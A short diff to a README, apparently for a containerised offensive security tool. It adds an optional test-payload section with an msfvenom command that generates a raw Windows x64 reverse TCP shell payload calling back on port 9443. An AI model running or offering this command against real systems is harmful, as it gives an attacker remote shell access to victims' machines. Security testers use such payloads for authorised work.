@@ -18,3 +18,10 @@ tuts: https://youtu.be/5Z4QXIDQVyE?si=UXykY_vxrarTooxw&t=646
 **NOTE**
 IF YOU ADDED SOME MODIFICATIONS, 
 YOU HAVE TO REBUILD THE CONTAINER BEFORE USING IT
+
+---
+**TEST PAYLOADS (OPTIONAL)**
+
+basic windows (bin)
+`msfvenom -p windows/x64/shell/reverse_tcp lhost=wlan lport=9443 -f raw -o basic.bin`
+
